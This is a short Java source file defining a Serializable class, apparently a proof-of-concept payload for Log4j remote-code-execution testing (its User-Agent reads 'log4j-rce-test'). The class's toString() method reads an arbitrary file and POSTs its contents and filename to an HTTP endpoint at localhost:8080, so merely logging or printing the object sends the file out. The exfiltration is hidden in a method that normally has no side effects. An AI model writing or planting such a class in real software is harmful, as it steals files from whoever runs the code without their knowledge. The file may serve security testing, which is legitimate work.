

import java.io.Serializable;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpHeaders;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpRequest.BodyPublishers;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;

public class FileToEndpointReader implements Serializable {

	private static final HttpClient httpClient = HttpClient.newBuilder()
		.version(HttpClient.Version.HTTP_1_1)
		.connectTimeout(Duration.ofSeconds(10))
		.build();


	private final String filename; 

	public FileToEndpointReader(String filename) {
		this.filename = filename;
	}

	@Override 
	public String toString() {
		try {
			HttpRequest request = HttpRequest.newBuilder()
					.POST(BodyPublishers.ofString(Files.readString(Path.of(filename))))
					.header("User-Agent", "log4j-rce-test")
					.header("X-Filename", filename)
					.uri(URI.create("http://localhost:8080/"))
					.build();

			HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());

			// print response headers
			HttpHeaders headers = response.headers();
			headers.map().forEach((k, v) -> System.out.println(k + ":" + v));

			// print status code
			System.out.println(response.statusCode());

			// print response body
			System.out.println(response.body());
		} catch (Exception e) {
			e.printStackTrace();
		}

		return "FileToEndpointReader(filename = " + filename + ")";
	}
}
